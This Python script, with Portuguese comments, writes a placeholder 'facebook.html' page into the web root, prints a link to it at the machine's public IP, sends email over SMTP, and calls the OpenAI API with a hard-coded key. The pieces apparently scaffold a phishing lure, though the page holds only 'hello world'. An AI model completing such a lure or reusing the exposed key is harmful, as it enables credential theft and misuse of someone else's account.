import requests
import socket
import sys
import os
import openai
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



def create_file(plataform):
    if plataform == 'facebook':
        with open("/var/www/html/facebook.html","w") as arquivo:
            arquivo.write('''
                            
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <p>hello world</p>
    </body>
    </html>                       
                                                
            '''
        )
    else:
        sys.exit()
'''       
    def get_ip():
        try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json()
        #print(ip['ip'])
        except:
            print('Error')
            sys.exit()
'''

def enviar_email(destinatario, assunto, corpo):
    # Configurações do remetente
    remetente = ''
    senha = ''

    # Configurar o objeto do e-mail
    msg = MIMEMultipart()
    msg['From'] = remetente
    msg['To'] = destinatario
    msg['Subject'] = assunto

    # Adicionar corpo do e-mail
    msg.attach(MIMEText(corpo, 'plain'))

    # Conectar ao servidor SMTP do Gmail
    servidor_smtp = ''
    porta_smtp = 587
    try:
        servidor = smtplib.SMTP(servidor_smtp, porta_smtp)
        #servidor.starttls()
        # Realizar login no servidor SMTP
        servidor.login(remetente, senha)
        # Enviar e-mail
        servidor.sendmail(remetente, destinatario, msg.as_string())
        print('E-mail enviado com sucesso!')
    except Exception as e:
        print('Erro ao enviar e-mail:', str(e))
    finally:
        # Fechar conexão com o servidor SMTP
        servidor.quit()


def ia(p):
    key = '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'
    openai.api_key = key
    model_engine = 'text-davinci-003'
    prompt = p
    # configurando geracao de resposta
    completion = openai.Completion.create(engine=model_engine, prompt=prompt, max_tokens=1024, temperature=0.5, )
    response = completion.choices[0].text
    print(response)


def link(plataform):
    
    response = requests.get('https://api.ipify.org?format=json')
    ip = response.json()
    ip = ip['ip']
    print(f'Link: http://{ip}/var/www/html/{plataform}.html')  
    try:
        create_file(plataform)
        #print(ip['ip'])
        print(f'File created!!')
    except:
        pass
